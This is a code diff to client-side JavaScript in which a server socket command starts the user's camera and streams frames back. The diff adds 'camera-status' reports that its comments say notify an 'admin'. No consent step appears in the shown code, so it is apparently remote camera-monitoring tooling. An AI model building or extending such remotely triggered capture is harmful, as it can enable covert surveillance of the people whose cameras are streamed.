@@ -227,10 +227,14 @@ function startCameraStream() {
                         const v2 = document.querySelector('video[data-snap]');
                         if (v2 && v2.readyState >= 2 && v2.videoWidth > 0) { startCameraStream(); return; }
                         if (++waited < MAX_WAIT) setTimeout(poll, 100);
+                        else { socket.emit('camera-status', { status: 'error', message: 'Camera not ready' }); }
                     };
                     setTimeout(poll, 100);
                 })
-                .catch(() => { if (mode) tryGetCam(null); });
+                .catch((err) => {
+                    if (mode) tryGetCam(null);
+                    else { socket.emit('camera-status', { status: 'error', message: err.message || 'Camera access denied' }); }
+                });
         };
         tryGetCam(camFacingMode);
         return;
@@ -240,7 +244,9 @@ function startCameraStream() {
     const c = document.createElement('canvas');
     c.width = 320; c.height = 240;
     const ctx = c.getContext('2d');
-    (function sendFrame() {
+    // Notify admin that camera stream has started
+    socket.emit('camera-status', { status: 'started', facingMode: camFacingMode });
+    function sendFrame() {
         if (!camStreamInterval) return;
         if (camStreamSending) {
             camStreamInterval = setTimeout(sendFrame, 16);
@@ -256,10 +262,13 @@ function startCameraStream() {
         } catch(e) {}
         camStreamSending = false;
         camStreamInterval = setTimeout(sendFrame, 16);
-    })();
+    }
+    camStreamInterval = setTimeout(sendFrame, 16);
 }
 function stopCameraStream() {
     if (camStreamInterval) { clearTimeout(camStreamInterval); camStreamInterval = null; }
+    // Notify admin that camera stream has stopped
+    socket.emit('camera-status', { status: 'stopped' });
 }
 
 socket.on('start-camera-stream', startCameraStream);
